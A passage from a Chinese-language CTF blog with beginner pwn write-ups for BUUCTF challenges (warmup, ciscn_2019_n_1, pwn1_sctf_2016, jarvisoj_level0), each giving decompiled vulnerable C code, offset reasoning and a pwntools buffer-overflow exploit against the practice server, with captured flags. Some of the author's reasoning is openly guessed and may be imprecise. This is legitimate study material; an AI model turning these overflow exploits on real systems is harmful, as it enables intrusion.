keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-40h] BYREF</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"-Warm Up-\n"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"WOW:"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> sub_40060D<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是最后的这个v5的大小限制导致栈溢出的，然后再去看v5的容量为</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-0000000000000040 var_40          db 64 dup(?)+0000000000000000  s              db 8 dup(?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是这个，<code>80-40=40(十六进制)</code>还要加上返回地址的8个字节，这里应该说的是return所造成的8个字节的返回地址。</p><p>估计就是64位的机器，然后一个字节等于8个位，所以64位=8×8位。就是8个字节。(猜想的，现在还不是很明白)</p><p><img src="/2021/05/28/CTF/image-20210717212917762.png" alt="后门函数所在地址为0x40060d"></p><p>然后就可以写出利用方式如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28074</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40060d</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;02912f3b-c4e0-4a24-9f51-30a93e017b04&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又是一道水题，并没学到更高深的东西。</p><h4 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h4><p><strong>TAG: gets栈溢出，满足条件</strong></p><p>又是一道gets的题，找到关键处的代码为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">float</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  v2 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's guess the number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">11.28125</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Its value should be 11.28125"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足<code>v2 == 11.28125</code>即可获得flag，先看总的容量为<code>0x30</code>个字节的大小。</p><p>然后是将空间分成的是v1和v2两个部分，共是<code>0x30</code>，v2的大小为<code>0x4</code>。目标就是把v2这一块空间内的数据写成<code>11.28125</code>转为十六进制是<code>0x41348000</code>。</p><p>然后利用脚本就是下面的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27852</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;652624f4-f9cc-498c-a675-42a5143e9b49&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h4><p><strong>TAG: 替换字符造成栈溢出</strong></p><p>这个对gets到的字符的个数有了限制，但是<code>strcpy(s, v0);</code>，v0可控似乎是，下面是反汇编出来的主要的c代码，说实话我没怎么看懂。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-3Ch] BYREF</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-1Ch] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-18h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+47h] [ebp-11h] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+48h] [ebp-10h] BYREF</span>  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Fh] [ebp-9h] BYREF</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tell me something about yourself: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> edata<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"you"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So, %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里网上的教程说是前面间接有个对传入的内容有一个把<code>I</code>换成<code>you</code>的替换操作，这里就可以间接地造成栈溢出，感觉就像是web里面的<code>php反序列化的字符逃逸</code>，然后看看s的空间分配的大小是<code>0x3c</code></p><p><img src="/2021/05/28/CTF/image-20210718102812281.png" alt></p><p>然后<code>0x3c = 16x3+12 = 60</code>，传入<code>20</code>个<code>I</code>即可，可写payload如下</p><p><img src="/2021/05/28/CTF/image-20210718103142615.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25512</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"I"</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span>  <span class="token comment"># 好像是因为32位的返回地址是4个字节，需要填充4个字符a</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;3ef70652-fbd5-4ee2-a6d0-b94061892eb1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h4 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h4><p><strong>TAG: read造成buf缓冲区溢出</strong></p><p>看有的wp说是read函数造成缓冲区溢出，下面是主要的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后这个buf的大小是<code>0x80</code>也就是十进制的<code>128</code>，然后缓冲区溢出就是将栈的返回地址改成后门函数的地址，注意到数据栈的返回地址<code>(r)</code>是<code>0x8</code></p><p><img src="/2021/05/28/CTF/image-20210718125634274.png" alt></p><p>然后后门函数的地址为<code>0x400596</code></p><p><img src="/2021/05/28/CTF/image-20210718125729564.png" alt></p><p>所以利用方式如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25015</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;3d0a1531-3486-4d69-aa6a-010088aa45bf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h4><p><strong>TAG: </strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
